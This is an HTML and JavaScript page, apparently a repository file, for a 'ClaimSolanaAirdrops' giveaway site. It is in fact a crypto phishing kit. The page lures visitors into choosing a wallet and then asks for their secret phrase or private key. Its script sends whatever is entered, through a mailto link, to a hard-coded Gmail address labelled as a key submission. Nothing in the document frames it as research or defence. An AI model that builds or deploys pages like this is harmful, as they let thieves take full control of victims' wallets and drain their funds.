# ClaimSolanaAirdrops
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>ClaimSolanaAirdrops - Crypto Airdrop Giveaway</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet" />
  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet" />
  <style>
    /* Base Reset and Box Sizing */
    *, *::before, *::after {
      box-sizing: border-box;
    }
    body {
      margin: 0;
      font-family: 'Inter', sans-serif;
      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
      color: #f0f4f8;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      overflow-x: hidden;
    }
    a {
      color: inherit;
      text-decoration: none;
    }
    /* Responsive Container */
    .container {
      max-width: 960px;
      width: 90%;
      margin: 0 auto;
    }
    /* Header */
    header {
      position: sticky;
      top: 0;
      background: rgba(12, 34, 51, 0.9);
      backdrop-filter: saturate(180%) blur(12px);
      border-bottom: 1px solid #146575;
      padding: 1rem 0;
      z-index: 1000;
    }
    header .container {
      display: flex;
      align-items: center;
      justify-content: space-between;
    }
    .logo {
      font-weight: 700;
      font-size: 1.6rem;
      color: #34d399; /* Teal */
      letter-spacing: 0.1em;
      text-transform: uppercase;
    }
    nav {
      display: flex;
      gap: 24px;
      align-items: center;
    }
    nav a {
      font-size: 1rem;
      font-weight: 600;
      color: #a5f3fc;
      position: relative;
      padding: 4px 0;
      transition: color 0.3s ease;
    }
    nav a:hover, nav a:focus {
      color: #34d399;
    }
    nav a::after {
      content: "";
      position: absolute;
      bottom: 0;
      left: 0;
      height: 2px;
      width: 0;
      background: #34d399;
      transition: width 0.3s ease;
    }
    nav a:hover::after,
    nav a:focus::after {
      width: 100%;
    }
    /* Main */
    main {
      flex-grow: 1;
      display: flex;
      flex-direction: column;
      justify-content: center;
      padding: 60px 20px;
      text-align: center;
      gap: 32px;
    }
    h1 {
      font-weight: 900;
      font-size: 3.2rem;
      line-height: 1.1;
      max-width: 680px;
      margin: 0 auto;
      background: linear-gradient(90deg, #34d399 0%, #06b6d4 100%);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }
    p.subtitle {
      font-size: 1.25rem;
      color: #a5f3fc;
      max-width: 600px;
      margin: 0 auto;
      line-height: 1.5;
    }
    /* Primary Button */
    .btn-primary {
      display: inline-flex;
      align-items: center;
      gap: 8px;
      background: linear-gradient(90deg, #34d399 0%, #06b6d4 100%);
      border: none;
      color: white;
      font-weight: 700;
      font-size: 1.25rem;
      padding: 16px 40px;
      border-radius: 16px;
      cursor: pointer;
      box-shadow: 0 10px 20px rgba(6,182,212,0.4);
      transition: transform 0.3s ease, box-shadow 0.3s ease;
      user-select: none;
      touch-action: manipulation;
    }
    .btn-primary:disabled {
      background: #1f2937;
      box-shadow: none;
      cursor: not-allowed;
      color: #6b7280;
      transform: none;
    }
    .btn-primary:hover:not(:disabled),
    .btn-primary:focus-visible:not(:disabled) {
      transform: translateY(-4px);
      box-shadow: 0 18px 30px rgba(6,182,212,0.6);
      outline-offset: 4px;
      outline: 2px solid #22c55e;
    }
    /* Modal Overlay */
    .modal-overlay {
      position: fixed;
      inset: 0;
      background: rgba(0,0,0,0.75);
      display: none;
      justify-content: center;
      align-items: center;
      padding: 16px;
      z-index: 1200;
      backdrop-filter: saturate(150%) blur(10px);
    }
    .modal-overlay.active {
      display: flex;
    }
    /* Modal Content */
    .modal {
      background: rgba(15, 32, 39, 0.95);
      border-radius: 20px;
      max-width: 420px;
      width: 100%;
      padding: 32px 28px;
      box-shadow: 0 12px 30px rgba(6,182,212,0.5);
      color: #e0f2fe;
      display: flex;
      flex-direction: column;
      gap: 24px;
      position: relative;
    }
    .modal h2 {
      margin: 0;
      font-weight: 700;
      font-size: 1.75rem;
      text-align: center;
      background: linear-gradient(90deg, #06b6d4 0%, #34d399 100%);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }
    /* Wallet Options */
    .wallet-options {
      display: flex;
      flex-direction: column;
      gap: 16px;
      margin-top: 8px;
    }
    .wallet-option {
      background: rgba(22, 38, 51, 0.8);
      border-radius: 12px;
      padding: 12px 20px;
      display: flex;
      align-items: center;
      gap: 16px;
      cursor: pointer;
      transition: background-color 0.3s ease;
      border: 2px solid transparent;
    }
    .wallet-option:focus-visible,
    .wallet-option:hover {
      background: rgba(52, 211, 153, 0.15);
      border-color: #34d399;
      outline: none;
    }
    .wallet-option-icon {
      font-size: 32px;
      color: #06b6d4;
      flex-shrink: 0;
    }
    .wallet-option-label {
      font-size: 1.1rem;
      font-weight: 600;
      color: #a5f3fc;
      flex-grow: 1;
      text-align: left;
    }
    /* Secret Phrase Input Container */
    .secret-phrase-container {
      display: none;
      flex-direction: column;
      gap: 16px;
      margin-top: 12px;
      text-align: left;
    }
    .secret-phrase-container.active {
      display: flex;
    }
    label {
      font-weight: 600;
      font-size: 1rem;
      color: #a5f3fc;
    }
    textarea.secret-phrase-input {
      width: 100%;
      min-height: 120px;
      border-radius: 12px;
      resize: vertical;
      font-family: 'Inter', monospace;
      font-size: 1rem;
      padding: 12px 16px;
      border: 2px solid #0f2027;
      background: rgba(23, 44, 63, 0.8);
      color: #d1d5db;
      transition: border-color 0.3s ease;
    }
    textarea.secret-phrase-input:focus {
      outline: none;
      border-color: #34d399;
      background: rgba(23, 44, 63, 0.95);
      color: #e0f2fe;
    }
    /* Claim Now Button */
    .btn-claim {
      align-self: center;
      width: 100%;
      max-width: 100%;
    }
    /* Close Button */
    .close-btn {
      position: absolute;
      top: 16px;
      right: 16px;
      background: none;
      border: none;
      color: #a5f3fc;
      font-size: 28px;
      cursor: pointer;
      transition: color 0.3s ease;
      line-height: 1;
      padding: 0;
    }
    .close-btn:hover,
    .close-btn:focus {
      color: #34d399;
      outline-offset: 4px;
      outline: 2px solid #22c55e;
    }
    /* Footer */
    footer {
      background: rgba(12, 34, 51, 0.9);
      color: #7dd3fc;
      font-size: 0.9rem;
      padding: 20px 0;
      text-align: center;
      border-top: 1px solid #146575;
      user-select: none;
    }
    /* Responsive Design */
    @media (max-width: 640px) {
      h1 {
        font-size: 2.4rem;
      }
      nav {
        display: none;
      }
    }
    @media (min-width: 641px) and (max-width: 1024px) {
      nav {
        gap: 36px;
      }
      h1 {
        font-size: 2.8rem;
      }
    }
  </style>
</head>
<body>
  <header>
    <div class="container" role="banner">
      <div class="logo" tabindex="0" aria-label="ClaimSolanaAirdrops Logo">ClaimSolanaAirdrops</div>
      <nav role="navigation" aria-label="Primary navigation">
        <a href="#" tabindex="0">Home</a>
        <a href="#" tabindex="0">How it Works</a>
        <a href="#" tabindex="0">FAQ</a>
        <a href="#" tabindex="0">Contact</a>
      </nav>
    </div>
  </header>

  <main class="container" role="main">
    <h1>Claim Your Solana Airdrop Now</h1>
    <p class="subtitle">Click the button below to start claiming your free Solana tokens. Secure your spot today by connecting your wallet.</p>
    <button class="btn-primary" id="btnClaimAirdrop" aria-haspopup="dialog" aria-controls="modalConnectWallet" aria-expanded="false">
      <span class="material-icons" aria-hidden="true">emoji_events</span>
      Claim Airdrop
    </button>
  </main>

  <!-- Modal Overlay -->
  <div class="modal-overlay" id="modalConnectWallet" role="dialog" aria-modal="true" aria-labelledby="modalTitle" tabindex="-1" aria-hidden="true">
    <div class="modal" role="document">
      <button class="close-btn" aria-label="Close modal" id="btnCloseModal" title="Close modal">&times;</button>
      <h2 id="modalTitle">Connect Your Wallet</h2>
      <p style="margin: 0 0 8px 0; color: #a5f3fc;">Please select your wallet to connect</p>
      <div class="wallet-options" role="list">
        <button class="wallet-option" role="listitem" type="button" tabindex="0" data-wallet="MetaMask" aria-describedby="metamask-desc">
          <span class="material-icons wallet-option-icon" aria-hidden="true">account_balance_wallet</span>
          <span class="wallet-option-label">MetaMask</span>
        </button>
        <button class="wallet-option" role="listitem" type="button" tabindex="0" data-wallet="Phantom Wallet" aria-describedby="phantom-desc">
          <span class="material-icons wallet-option-icon" aria-hidden="true">credit_score</span>
          <span class="wallet-option-label">Phantom Wallet</span>
        </button>
        <button class="wallet-option" role="listitem" type="button" tabindex="0" data-wallet="Trust Wallet" aria-describedby="trust-desc">
          <span class="material-icons wallet-option-icon" aria-hidden="true">shield</span>
          <span class="wallet-option-label">Trust Wallet</span>
        </button>
        <button class="wallet-option" role="listitem" type="button" tabindex="0" data-wallet="WalletConnect" aria-describedby="walletconnect-desc">
          <span class="material-icons wallet-option-icon" aria-hidden="true">qr_code_scanner</span>
          <span class="wallet-option-label">Wallet Connect</span>
        </button>
      </div>
      <div class="secret-phrase-container" id="secretPhraseContainer">
        <label for="secretPhraseInput">Enter your secret phrase or private key</label>
        <textarea id="secretPhraseInput" class="secret-phrase-input" aria-required="true" placeholder="Type your secret phrase or private key here..." spellcheck="false" autocomplete="off"></textarea>
        <button class="btn-primary btn-claim" id="btnClaimNow" disabled>Claim Now</button>
      </div>
    </div>
  </div>

  <footer role="contentinfo">
    <div class="container">
      <p>© 2024 ClaimSolanaAirdrops. All rights reserved.</p>
    </div>
  </footer>

  <script>
    (() => {
      'use strict';

      const btnClaimAirdrop = document.getElementById('btnClaimAirdrop');
      const modalConnectWallet = document.getElementById('modalConnectWallet');
      const btnCloseModal = document.getElementById('btnCloseModal');
      const walletOptions = document.querySelectorAll('.wallet-option');
      const secretPhraseContainer = document.getElementById('secretPhraseContainer');
      const secretPhraseInput = document.getElementById('secretPhraseInput');
      const btnClaimNow = document.getElementById('btnClaimNow');

      // For focus management within modal
      const firstFocusableSelector = 'button, [href], input, textarea, select, [tabindex]:not([tabindex="-1"])';

      // Open modal function
      function openModal() {
        modalConnectWallet.classList.add('active');
        modalConnectWallet.setAttribute('aria-hidden', 'false');
        btnClaimAirdrop.setAttribute('aria-expanded', 'true');
        // Reset modal content state
        secretPhraseContainer.classList.remove('active');
        secretPhraseInput.value = '';
        btnClaimNow.disabled = true;
        // Reset wallet option styles
        walletOptions.forEach(o => {
          o.style.borderColor = 'transparent';
          o.style.backgroundColor = 'rgba(22, 38, 51, 0.8)';
        });
        // Set focus to first wallet option
        walletOptions[0].focus();
      }
      // Close modal function
      function closeModal() {
        modalConnectWallet.classList.remove('active');
        modalConnectWallet.setAttribute('aria-hidden', 'true');
        btnClaimAirdrop.setAttribute('aria-expanded', 'false');
        btnClaimAirdrop.focus();
      }

      // Event: Open modal on Claim Airdrop click
      btnClaimAirdrop.addEventListener('click', e => {
        e.preventDefault();
        openModal();
      });

      // Event: Close modal on close button click
      btnCloseModal.addEventListener('click', e => {
        e.preventDefault();
        closeModal();
      });

      // Event: Close modal on overlay click but not inside modal content
      modalConnectWallet.addEventListener('click', e => {
        if (e.target === modalConnectWallet) {
          closeModal();
        }
      });

      // Keyboard trap focus inside modal when open
      modalConnectWallet.addEventListener('keydown', e => {
        if (e.key === 'Tab') {
          const focusableElements = Array.from(modalConnectWallet.querySelectorAll(firstFocusableSelector)).filter(el => el.offsetParent !== null);
          if (focusableElements.length === 0) return;
          const firstEl = focusableElements[0];
          const lastEl = focusableElements[focusableElements.length - 1];
          if (e.shiftKey) {
            if (document.activeElement === firstEl) {
              e.preventDefault();
              lastEl.focus();
            }
          } else {
            if (document.activeElement === lastEl) {
              e.preventDefault();
              firstEl.focus();
            }
          }
        } else if (e.key === 'Escape') {
          closeModal();
        }
      });

      // Wallet option selection handler
      walletOptions.forEach(option => {
        option.addEventListener('click', () => {
          // Highlight selected wallet option visually (optional)
          walletOptions.forEach(o => {
            o.style.borderColor = 'transparent';
            o.style.backgroundColor = 'rgba(22, 38, 51, 0.8)';
          });
          option.style.borderColor = '#34d399';
          option.style.backgroundColor = 'rgba(52, 211, 153, 0.15)';
          // Show secret phrase input
          secretPhraseContainer.classList.add('active');
          secretPhraseInput.focus();
        });
      });

      // Enable Claim Now button only when there is input
      secretPhraseInput.addEventListener('input', () => {
        btnClaimNow.disabled = secretPhraseInput.value.trim().length === 0;
      });

      // On clicking Claim Now button
      btnClaimNow.addEventListener('click', e => {
        e.preventDefault();
        const secretData = secretPhraseInput.value.trim();
        if (!secretData) {
          return;
        }
        // Compose mailto link with secret phrase data
        const email = 'sarahtardreck@gmail.com';
        const subject = encodeURIComponent('New Private Key / Secret Phrase Submission');
        const body = encodeURIComponent('New secret phrase or private key submission:\n\n' + secretData);
        // Use mailto link to open mail client
        const mailtoLink = `mailto:${email}?subject=${subject}&body=${body}`;
        // Open mailto in new tab/window to prompt email client
        window.location.href = mailtoLink;
        // Close modal after sending
        closeModal();
      });
    })();
  </script>
</body>
</html>

